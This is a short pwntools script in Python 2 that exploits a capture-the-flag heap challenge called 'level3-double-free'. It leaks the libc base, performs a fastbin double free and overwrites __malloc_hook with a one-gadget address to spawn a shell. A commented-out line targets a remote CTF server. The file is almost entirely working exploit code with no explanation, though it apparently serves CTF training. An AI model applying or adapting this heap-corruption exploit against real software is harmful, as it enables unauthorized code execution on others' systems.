from pwn import *

context.log_level="debug"

def add(data):
    r.sendlineafter('>> ', '1')
    r.sendlineafter(': ', data)
def dele(idx):
    r.sendlineafter('>> ', '3')
    r.sendlineafter(':', str(idx))
def exploit(r): 
    r.recvuntil(':')
    tmp = int(r.recvline().strip(), 16)
    libc.address = tmp - libc.sym['setbuf']
    info('%016x libc.address', libc.address)
    add('aaa') # 0 
    add('bbb') # 1
    dele(0)
    dele(1)
    dele(0)
    add( p64(libc.sym['__malloc_hook']-19 ) )
    add('c'*8)
    add('c'*8)
    add('a'*3 + p64(libc.address + 0xf02a4))
    #add('aaa')
    r.sendlineafter('>> ', '1')


r=process("./level3-double-free")
#r=remote("pwn.sixstars.team",22503)
elf=ELF("./level3-double-free")
libc=ELF("./libc.so.6")
print r.pid
pause()
exploit(r)
r.interactive()

